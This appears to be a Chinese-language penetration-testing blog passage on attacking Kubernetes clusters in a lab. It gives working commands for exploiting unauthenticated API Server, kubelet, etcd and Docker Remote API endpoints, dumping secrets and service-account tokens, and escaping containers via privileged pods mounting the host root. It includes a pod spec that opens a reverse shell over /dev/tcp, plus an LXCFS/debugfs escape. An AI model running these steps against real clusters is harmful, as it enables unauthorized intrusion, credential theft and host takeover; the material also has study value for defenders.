</div><p><strong>查询账号权限（用户账号以及服务账号）</strong></p>
<p>通过角色绑定关系来查询：<code>kubectl describe -A clusterrolebindings,rolebindings |grep 用户名</code></p>
<p>kubectl 命令后添加<code>-v=10</code> 参数，可以显示kubectl 向api server 发送请求的详细信息。</p>
<h2 id="资产发现"><a href="#资产发现" class="anchor-link">#</a><a href="#contents:资产发现" class="headings">资产发现</a></h2>
<p>k8s常见端口：<code>443,2375,2379,2380,4194,6666,6443,8443,8080,8081,10250,10252,10255,4149,9443,9444</code> 以及30000 以上的Dashboard 端口。
<img src="/images/16697105504486.jpg" alt="">
<a href="https://github.com/aquasecurity/kube-hunter" target="_blank" rel="noopener">kube-hunter</a> 可以远程扫描，也可以在容器里扫描。</p>
<h2 id="未授权访问"><a href="#未授权访问" class="anchor-link">#</a><a href="#contents:未授权访问" class="headings">未授权访问</a></h2>
<h3 id="api-server-未授权访问"><a href="#api-server-未授权访问" class="anchor-link">#</a><a href="#contents:api-server-未授权访问" class="headings">API Server 未授权访问</a></h3>
<p>API Server  可以在两个端口上提供对外服务：8080（insecure-port）和6443（secure-port），其中8080端口提供HTTP服务且无需身份认证，一般未启用。（这两个端口不固定，都可通过配置文件修改）</p>
<p>可在 <code>/etc/kubernets/manifests/kube-apiserver.yaml</code> 配置 <code>--insecure-port=8080</code> 来启用8080端口，但在1.20版本后无效。</p>
<p>不带任何凭据直接访问6443端口，会被默认以system:anonymous 用户权限访问，提示拒绝。
<img src="/images/16697106304584.jpg" alt="">
另一种未授权场景是，如果将annoymous 用户与集群管理员cluster-admin角色绑定。</p>
<pre tabindex="0"><code>kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
</code></pre><p>再次访问就能看到内容：（实际环境中，访问此端口出现如下内容那就是存在未授权）</p>
<p><img src="/images/16697106413433.jpg" alt="">
写入用户名密码、API Server 服务器地址、上下文信息到config文件。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#这里账号密码随意</span>
</span></span><span class="line"><span class="cl">kubectl config set-credentials anonymous --username<span class="o">=</span>anonymous --password<span class="o">=</span>anonymous --kubeconfig<span class="o">=</span>./anonymous.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#设置API Server地址，cluster.local这个值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-cluster cluster.local --server<span class="o">=</span>https://192.168.223.142:6443/  --insecure-skip-tls-verify --kubeconfig<span class="o">=</span>./anonymous.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#在配置文件中，设置上下文，kubernetes-admin@cluster.local 值随意，但前后要统一</span>
</span></span><span class="line"><span class="cl">kubectl config set-context kubernetes-admin@cluster.local --cluster<span class="o">=</span>cluster.local --user<span class="o">=</span>anonymous --kubeconfig<span class="o">=</span>./anonymous.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#切换上下文</span>
</span></span><span class="line"><span class="cl">kubectl config use-context kubernetes-admin@cluster.local --kubeconfig<span class="o">=</span>./anonymous.kubeconfig
</span></span><span class="line"><span class="cl"><span class="c1">#正常匿名访问了</span>
</span></span><span class="line"><span class="cl">kubectl get pods --kubeconfig<span class="o">=</span>./anonymous.kubeconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#或直接一行命令，只是需要每次都输入密码，随便输就好了</span>
</span></span><span class="line"><span class="cl">kubectl -s https://192.168.223.142:6443/ --insecure-skip-tls-verify<span class="o">=</span><span class="nb">true</span> get nodes
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>不使用kubectl命令，也可直接请求 restful API，例如：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#查看kube-ystem命名空间下的token</span>
</span></span><span class="line"><span class="cl">https://192.168.223.142:6443/api/v1/namespaces/kube-system/secrets/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#查看pods</span>
</span></span><span class="line"><span class="cl">https://192.168.223.142:6443/api/v1/namespaces/default/pods?limit<span class="o">=</span><span class="m">500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#创建特权容器</span>
</span></span><span class="line"><span class="cl">https://192.168.223.142:6443/api/v1/namespaces/default/pods/test
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;apiVersion&#34;</span>:<span class="s2">&#34;v1&#34;</span>,<span class="s2">&#34;kind&#34;</span>:<span class="s2">&#34;Pod&#34;</span>,<span class="s2">&#34;metadata&#34;</span>:<span class="o">{</span><span class="s2">&#34;annotations&#34;</span>:<span class="o">{</span><span class="s2">&#34;kubectl.kubernetes.io/last-applied-configuration&#34;</span>:<span class="s2">&#34;{\&#34;apiVersion\&#34;:\&#34;v1\&#34;,\&#34;kind\&#34;:\&#34;Pod\&#34;,\&#34;metadata\&#34;:{\&#34;annotations\&#34;:{},\&#34;name\&#34;:\&#34;test\&#34;,\&#34;namespace\&#34;:\&#34;default\&#34;},\&#34;spec\&#34;:{\&#34;containers\&#34;:[{\&#34;image\&#34;:\&#34;nginx:1.14.2\&#34;,\&#34;name\&#34;:\&#34;test\&#34;,\&#34;volumeMounts\&#34;:[{\&#34;mountPath\&#34;:\&#34;/host\&#34;,\&#34;name\&#34;:\&#34;host\&#34;}]}],\&#34;volumes\&#34;:[{\&#34;hostPath\&#34;:{\&#34;path\&#34;:\&#34;/\&#34;,\&#34;type\&#34;:\&#34;Directory\&#34;},\&#34;name\&#34;:\&#34;host\&#34;}]}}\n&#34;</span><span class="o">}</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;test&#34;</span>,<span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span><span class="o">}</span>,<span class="s2">&#34;spec&#34;</span>:<span class="o">{</span><span class="s2">&#34;containers&#34;</span>:<span class="o">[{</span><span class="s2">&#34;image&#34;</span>:<span class="s2">&#34;nginx:1.14.2&#34;</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;test&#34;</span>,<span class="s2">&#34;volumeMounts&#34;</span>:<span class="o">[{</span><span class="s2">&#34;mountPath&#34;</span>:<span class="s2">&#34;/host&#34;</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;host&#34;</span><span class="o">}]}]</span>,<span class="s2">&#34;volumes&#34;</span>:<span class="o">[{</span><span class="s2">&#34;hostPath&#34;</span>:<span class="o">{</span><span class="s2">&#34;path&#34;</span>:<span class="s2">&#34;/&#34;</span>,<span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;Directory&#34;</span><span class="o">}</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;host&#34;</span><span class="o">}]}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#执行命令</span>
</span></span><span class="line"><span class="cl">https://192.168.223.142:6443/api/v1/namespace/default/pods/test/exec?command<span class="o">=</span>whoami
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="kubelet-未授权访问"><a href="#kubelet-未授权访问" class="anchor-link">#</a><a href="#contents:kubelet-未授权访问" class="headings">kubelet 未授权访问</a></h3>
<p>每个工作节点（Node）都有一个kubelet 服务，kubelet 监听了10250、10248、10255等端口。</p>
<p>kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod。</p>
<p>一般情况10250开在节点IP上的，而10248开在localhost。</p>
<p>正常访问是没有权限的</p>
<p><img src="/images/16697106562380.jpg" alt="">
手动允许anonymous 访问，查看服务中的kubelet 配置文件位置</p>
<p><code>service kubelet status -l</code></p>
<p><img src="/images/16697106656348.jpg" alt="">
将<code>/etc/kubernetes/kubelet-config.yaml</code> anonymous修改为True。
<img src="/images/16697106763754.jpg" alt="">
再次访问
<img src="/images/16697106845757.jpg" alt="">
下载<a href="https://github.com/cyberark/kubeletctl/" target="_blank" rel="noopener">kubeletctl</a></p>
<p>查看Pods： <code>./kubeletctl_linux_amd64 pods -s 192.168.223.143 --port 10250</code></p>
<p><img src="/images/16697107279887.jpg" alt="">
通过上图知道$namespace、$POD、$CONTAINERS 后，就能在容器里执行命令：</p>
<p><code>curl -k https://192.168.223.143:10250/run/default/netchecker-agent-j9fm6/netchecker-agent -d &quot;cmd=ls /var/run/secrets/kubernetes.io/serviceaccount/&quot; --insecure</code>
<img src="/images/16697107358664.jpg" alt="">
<img src="/images/16697107396244.jpg" alt="">
此目录下保存了容器的服务账户的证书、命名空间和token，查看容器中服务账号的Token：<code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></p>
<p>然后可利用此token生成config，根据具体的权限进行利用。</p>
<h3 id="etcd-未授权访问"><a href="#etcd-未授权访问" class="anchor-link">#</a><a href="#contents:etcd-未授权访问" class="headings">etcd 未授权访问</a></h3>
<p>etcd 服务默认监听了2379 端口，etcd 若存在未授权，攻击者导出全量etcd配置，可获取存储的各种服务的账号密码、公私钥、服务token等敏感数据。</p>
<p>正常情况
<img src="/images/16697107548420.jpg" alt="">
修改<code>/etc/etcd.env</code> 注释掉TLS 相关内容，将https改为http。</p>
<p><img src="/images/16697107641592.jpg" alt="">
再次访问出现如下界面，代表存在未授权。</p>
<p><img src="/images/16697107720396.jpg" alt="">
下载 <a href="https://github.com/etcd-io/" target="_blank" rel="noopener">etcd</a></p>
<p>遍历所有的key: <code>ETCDCTL_API=3 ./etcdctl --endpoints=http://192.168.223.142:2379/ get / --prefix --keys-only --limit=10</code></p>
<p>如果服务器启用了https，添加 <code>--insecure-transport=false --insecure-skip-tls-verify</code> 参数来忽略证书校验</p>
<p><img src="/images/16697108113955.jpg" alt="">
通过v3 API来dump数据库到 output.data。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ETCDCTL_API</span><span class="o">=</span><span class="m">3</span> ./etcdctl --endpoints<span class="o">=</span>http://192.168.223.142:2379/ get / --prefix --keys-only <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> xargs -I<span class="o">{}</span> sh -c <span class="s1">&#39;ETCDCTL_API=3 ./etcdctl --endpoints=http://192.168.223.142:2379/ get {} &gt;&gt; output.data &amp;&amp; echo &#34;&#34; &gt;&gt; output.data&#39;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>在文件中寻找<code>token:</code> 关键字，再使用token生成config文件进行利用。</p>
<p>或者在线查询</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">etcdctl --endpoints<span class="o">=</span>https://etcd_ip:2375/ get / --prefix --keys-only <span class="p">|</span> grep /secrets/
</span></span><span class="line"><span class="cl">etdctl --endpoints<span class="o">=</span>https://etcd_ip:2375/ get /registry/secrets/default/admin-token-55712
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="docker-remote-api-未授权访问"><a href="#docker-remote-api-未授权访问" class="anchor-link">#</a><a href="#contents:docker-remote-api-未授权访问" class="headings">Docker Remote API 未授权访问</a></h3>
<p>Docker以 C/S模式工作，其中 docker daemon服务在后台运行，负责管理容器的创建、运行和停止操作。</p>
<p>在Linux主机上，docker daemon监听在<code>/var/run/docker.sock</code>中创建的unix socket，2375 端口用于未认证的 HTTP 通信，2376 用于可信 HTTPS 通信。</p>
<p>当docker 配置了Restful api，那么可以通过HTTP 管理docker。</p>
<p>在<code>/usr/lib/systemd/system/docker.service</code>  添加 <code>-H tcp://0.0.0.0:2375</code></p>
<p><img src="/images/16697108222569.jpg" alt=""></p>
<p>访问2375端口如下，说明存在未授权访问。</p>
<p><img src="/images/16697108322728.jpg" alt="">
通过API 查看运行的主机：</p>
<p><code>docker -H tcp://192.168.223.139:2375 ps</code>
<img src="/images/16697108412517.jpg" alt="">
获取主机权限：可以利用Docker API在远程主机上创建一个特权容器，并且挂载主机根目录到容器，对主机进行进一步的渗透。</p>
<p><code>docker -H 192.168.223.139:2375 run --rm -it --privileged --net=host -v /:/mnt busybox</code></p>
<p>如下图，成功获取宿主机权限</p>
<p><img src="/images/16697108504636.jpg" alt=""></p>
<h2 id="容器逃逸"><a href="#容器逃逸" class="anchor-link">#</a><a href="#contents:容器逃逸" class="headings">容器逃逸</a></h2>
<blockquote>
<p>本质上容器内的进程只是一个受限的普通宿主机进程，容器内部进程的所有行为对于宿主机来说是透明的。容器逃逸的本质和硬件虚拟化逃逸的本质有很大的不同，容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup/Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。</p>
</blockquote>
<p>场景：通过web 打下一个k8s集群中的pod，如何利用此pod逃逸到pod所在的宿主机（即工作节点）？</p>
<h3 id="容器内信息搜集"><a href="#容器内信息搜集" class="anchor-link">#</a><a href="#contents:容器内信息搜集" class="headings">容器内信息搜集</a></h3>
<ol>
<li><code>cat /proc/1/cgroup</code> 有kubepods 说明在k8s容器中，如果显示是docker，那就是在docker 容器中。（也可以依据<code>env</code> 判断）
<img src="/images/16697108968121.jpg" alt=""></li>
<li><code>cat /proc/1/status |grep Cap</code> 查看当前容器的Capabilities 信息 （有无特权）
<img src="/images/16697109074036.jpg" alt="">
<code>capsh --decode=00000000a80425fb</code>
<img src="/images/16697109260710.jpg" alt=""></li>
<li><code>mount</code> 查询挂载的磁盘</li>
<li><code>cat /proc/1/mountinfo |grep lxcfs</code> 查看是否挂载了lxcfs，可进行后续利用。</li>
</ol>
<h3 id="利用高权限服务账号"><a href="#利用高权限服务账号" class="anchor-link">#</a><a href="#contents:利用高权限服务账号" class="headings">利用高权限服务账号</a></h3>
<p><strong>前提：</strong> 要求serviceaccount 具有创建容器（POD）的权限。</p>
<p>上传 kubectl 到目标（也可不上传，<code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> 获得token，在本地生成config文件，挂代理进行利用）</p>
<ol>
<li>
<p>执行<code>./kubectl auth can-i create pod</code> 如果返回yes，并且可以执行exec，那么可以进行逃逸。（这里主要是利用起这个pod的服务账号有创建pod和exec的权限）</p>
<p><img src="/images/16697109873117.jpg" alt="">
这里为了测试给该容器的服务账号添加create pod和exec权限。</p>
<p><code>kubectl create clusterrole &quot;netchecker-server&quot; --verb=get,list,create --resource=pods,pods/exec</code></p>
<p>再次查看权限：
<img src="/images/16697109967376.jpg" alt=""></p>
</li>
<li>
<p>通过ymal 创建一个特权容器，挂载宿主机的根目录到容器的<code>/myPath</code> 目录。</p>
<p>创建Pod：<code>./kubectl create -f 1.ymal</code></p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: v1
</span></span><span class="line"><span class="cl">kind: Pod
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: api-server
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  hostNetwork: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  hostPID: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  containers:
</span></span><span class="line"><span class="cl">  - name: api-server
</span></span><span class="line"><span class="cl">    image: alpine
</span></span><span class="line"><span class="cl">    imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">    command: <span class="o">[</span><span class="s2">&#34;bin/sh&#34;</span>,<span class="s2">&#34;-c&#34;</span>,<span class="s2">&#34;tail -f /dev/null&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    volumeMounts:
</span></span><span class="line"><span class="cl">       - name: hostsvolume
</span></span><span class="line"><span class="cl">         mountPath: /myPath
</span></span><span class="line"><span class="cl">    securityContext:
</span></span><span class="line"><span class="cl">       privileged: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  nodeName: master <span class="c1">#在指定节点上安装容器，可用于逃逸指定节点</span>
</span></span><span class="line"><span class="cl">  volumes:
</span></span><span class="line"><span class="cl">  - name: hostsvolume
</span></span><span class="line"><span class="cl">    hostPath:
</span></span><span class="line"><span class="cl">     path: /
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Tips1：</strong> 如果<code>kubectl describe nodes master</code> 查看主节点发现配置了  <code>Taints: node.kubernetes.io/unschedulable:NoSchedule</code> ，那么创建pod时，需要在spec下添加如下配置：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tolerations:
</span></span><span class="line"><span class="cl">    - key: node.kubernetes.io/unschedulable
</span></span><span class="line"><span class="cl">      operator: Exists
</span></span><span class="line"><span class="cl">      effect: NoSchedule
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Tips2：</strong> 可以不落ymal文件的方式创建：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat <span class="s">&lt;&lt; EOF | kubectl apply -f -
</span></span></span><span class="line"><span class="cl"><span class="s"># {YAML文件内容}
</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src="/images/16697110138725.jpg" alt="">
然后可以直接<code>chroot /myPath bash</code> 获取宿主机权限。</p>
<p>拿到master 机器权限，可以保存<code>/etc/kubernetes/admin.conf</code> 文件内容到本地，此为集群管理员权限的config，来控制集群所有pods。</p>
<p>或者保存ca证书到本地用作认证：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl -s https://192.168.223.142:6443/ --certificate-authority<span class="o">=</span>/etc/kubernetes/pki/ca.crt get nodes
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
</ol>
<p>Tips：如果机器出网的话，其实这里不需要有exec 权限，创建容器时可以直接反弹shell。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: v1
</span></span><span class="line"><span class="cl">kind: Pod
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: api-server2
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  hostNetwork: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  hostPID: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  containers:
</span></span><span class="line"><span class="cl">  - name: api-server2
</span></span><span class="line"><span class="cl">    image: bash
</span></span><span class="line"><span class="cl">    imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">    command: <span class="o">[</span><span class="s2">&#34;bash&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    args: <span class="o">[</span><span class="s2">&#34;-c&#34;</span>, <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.223.143/2333 0&gt;&amp;1&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    volumeMounts:
</span></span><span class="line"><span class="cl">       - name: hostsvolume
</span></span><span class="line"><span class="cl">         mountPath: /myPath
</span></span><span class="line"><span class="cl">    securityContext:
</span></span><span class="line"><span class="cl">       privileged: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">  nodeName: master
</span></span><span class="line"><span class="cl">  volumes:
</span></span><span class="line"><span class="cl">  - name: hostsvolume
</span></span><span class="line"><span class="cl">    hostPath:
</span></span><span class="line"><span class="cl">     path: /
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="利用-lxcfs"><a href="#利用-lxcfs" class="anchor-link">#</a><a href="#contents:利用-lxcfs" class="headings">利用 LXCFS</a></h3>
<p>Cgroup 实现了对容器（进程）资源的限制，但是在容器内部依然缺省挂载了宿主机的procfs的/proc目录，其中包含：meminfo、cpuinfo、stat、uptime等资源信息。一些监控工具如 free、top 会依赖上述文件获取资源配置和使用情况。这就导致了虽然cgroup 对容器资源做了限制，但是当进入到容器当中通过 free、top 等命令查看cpu内存信息的时候看到的是整个宿主机的cpu 内存。</p>
<p>LXCFS 是一个小型 FUSE 文件系统，使得Linux容器的文件系统更像虚拟机。启动以后会在指定目录中维护 <code>/proc</code>目录中的文件同名的文件，从而保证容器读取数据时读取到lxcfs维护的<code>/proc</code>文件中状态数据。也就是说lxcfs 可以使容器中类似如 free、top 获取到的资源配置和使用情况是容器自身的。</p>
<p>环境搭建：</p>
<ol>
<li>
<p>宿主机安装 <a href="https://github.com/lxc/lxcfs" target="_blank" rel="noopener">https://github.com/lxc/lxcfs</a>，并创建容器挂载lxcfs所在的/var目录。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m pip install meson jinja2 ninja
</span></span><span class="line"><span class="cl">git clone git://github.com/lxc/lxcfs
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> lxcfs
</span></span><span class="line"><span class="cl">meson setup -Dinit-script<span class="o">=</span>systemd --prefix<span class="o">=</span>/usr build/
</span></span><span class="line"><span class="cl">meson compile -C build/
</span></span><span class="line"><span class="cl">sudo meson install -C build/
</span></span><span class="line"><span class="cl"><span class="c1">#运行 lxcfs</span>
</span></span><span class="line"><span class="cl">mkdir -p /var/lib/lxcfs
</span></span><span class="line"><span class="cl">lxcfs /var/lib/lxcfs
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>创建容器</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: v1
</span></span><span class="line"><span class="cl">kind: Pod
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: lxcfs-rw
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  containers:
</span></span><span class="line"><span class="cl">  - name: lxcfs-rw-5
</span></span><span class="line"><span class="cl">    image: nginx
</span></span><span class="line"><span class="cl">    command: <span class="o">[</span><span class="s2">&#34;sleep&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    args: <span class="o">[</span><span class="s2">&#34;infinity&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">    volumeMounts:
</span></span><span class="line"><span class="cl">      - mountPath: /mydata
</span></span><span class="line"><span class="cl">        mountPropagation: HostToContainer
</span></span><span class="line"><span class="cl">        name: test-data
</span></span><span class="line"><span class="cl">  nodeName: master
</span></span><span class="line"><span class="cl">  volumes:
</span></span><span class="line"><span class="cl">  - name: test-data
</span></span><span class="line"><span class="cl">    hostPath:
</span></span><span class="line"><span class="cl">      path: /var
</span></span><span class="line"><span class="cl">      type: <span class="s2">&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p>判断当前容器是否使用了lxcfs</p>
<p><code>cat /proc/1/mountinfo |grep lxcfs</code>
<img src="/images/16697110400635.jpg" alt="">
<code>ls -l /mydata/lib/lxcfs</code>
<img src="/images/16697110478584.jpg" alt=""></p>
</li>
<li>
<p><code>/mydata/lib/lxcfs</code>路径下会绑定当前容器的 devices subsystem cgroup，且在容器内有权限对该 devices subsystem 进行修改。</p>
<p><code>echo a &gt; devices.allow</code>修改当前容器的设备访问权限，以此在容器内可以访问所有类型的设备。</p>
</li>
<li>
<p><code>/etc/hosts、/dev/termination-log、/etc/resolv.conf、/etc/hostname</code> 这四个容器内文件是由默认从宿主机挂载进容器的，所以在它们的挂载信息内可以获得主设备号 ID。</p>
<p><code>cat /proc/self/mountinfo|grep /etc</code>
<img src="/images/16697110589829.jpg" alt=""></p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#使用mknod创建相应的设备文件目录并使用debugfs进行访问，此时就有了读写宿主机任意文件的权限。</span>
</span></span><span class="line"><span class="cl"><span class="c1">#这里的8 3就是上图的主设备号ID</span>
</span></span><span class="line"><span class="cl">mknod mknod_near b <span class="m">8</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl"><span class="c1">#挂载</span>
</span></span><span class="line"><span class="cl">debugfs -w mknod_near
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src="/images/16697110677507.jpg" alt="">
debugfs 主要用来对ext2/ext3/ext4文件系统进行调试，可以用来恢复文件。</p>
<p><strong>注：如上图，注意这里的宿主机是Centos7 ，它的文件系统类型是xfs，不适用于debugfs命令，这里无法利用。（Centos 7 开始默认文件系统是xfs，Centos6是ext4，Centos5是ext3。所以Centos 7的宿主机不支持这种方法）</strong></p>
<p>这里借用了一张成功的图：
<img src="/images/16697110810243.jpg" alt=""></p>
</li>
</ol>
<p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw" target="_blank" rel="noopener">CDK</a> 也有此利用的模块。</p>
<h3 id="利用特权容器"><a href="#利用特权容器" class="anchor-link">#</a><a href="#contents:利用特权容器" class="headings">利用特权容器</a></h3>
<p>通过<code>fdisk -l</code> 判断是否在特权容器内，如果不在特权容器内此命令没有回显，当然目标上也不一定有这个命令（可上传CDK，通过<code>cdk evaluate</code> 获取）。</p>
